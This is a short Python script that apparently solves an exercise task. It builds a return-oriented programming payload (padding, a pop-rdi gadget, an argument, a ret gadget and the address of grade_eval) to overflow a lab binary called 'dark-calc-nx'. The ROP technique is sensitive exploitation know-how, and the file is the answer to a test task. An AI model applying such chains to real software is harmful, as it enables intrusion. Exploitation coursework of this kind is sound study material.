#!/usr/bin/env python3
"""Task 4: ROP on dark-calc-nx to call grade_eval(4)."""
import struct
import sys
POP_RDI_RET = 0x401A33
RET = 0x401A34
GRADE_EVAL = 0x401978
chain = (
    struct.pack("<Q", POP_RDI_RET)
    + struct.pack("<Q", 4)
    + struct.pack("<Q", RET)
    + struct.pack("<Q", GRADE_EVAL)
)
payload = b"A" * 0x18 + chain
assert len(payload) == 0x38
assert b"\n" not in payload
sys.stdout.buffer.write(payload)